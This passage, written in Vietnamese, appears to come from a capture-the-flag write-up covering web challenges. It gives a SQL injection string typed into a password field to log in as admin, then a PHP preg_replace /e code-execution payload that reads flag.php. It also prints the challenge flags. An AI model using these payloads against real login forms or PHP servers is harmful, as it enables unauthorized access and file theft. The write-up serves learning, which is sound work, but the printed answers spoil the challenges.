Sau 1 số lần thử thì tôi nhận thấy, Dù ta có bypass qua được thì tên người dùng vẫn là user1. mà nhiệm cụ của ta là phải lấy được password của admin kia. Để giải quyết vấn đề này ta nhập **admin** vào  ô login và **' or ( 1=1 and username='admin')--** vào ô password
Đọc source code ta được password: **t0_W34k!$**

![image.png](https://images.viblo.asia/d8cf16b8-610a-4b90-a5a0-e8fa449bbd7d.png)
# 33. PHP - preg_replace()
Tài liệu [này](http://www.madirish.net/402) là 1 hint khá tốt cho bài này. ở đây hàm preg_replace cung cấp 1 chức năng cho phép thực thi mã php ở đối số thứ 2 đó là /e. Điều ta cần làm là đọc được nội dung file flag.php. 
Ở đây ta điền ô search là /abc/e. Ô replace điền file_get_contents('flag.php') (dùng hàm này ở đây vì 1 số hàm khác như system(), exec()...không được phép vì lí do bảo mật). Ô content điền abc

![image.png](https://images.viblo.asia/e6448d9f-2694-4baf-9bff-860c47b6e631.png)

và được kết quả: 

![image.png](https://images.viblo.asia/602845f1-f191-4836-bbcb-4131fcae3e2c.png)

password: **pr3g_r3pl4c3_3_m0d1f13r_styl3**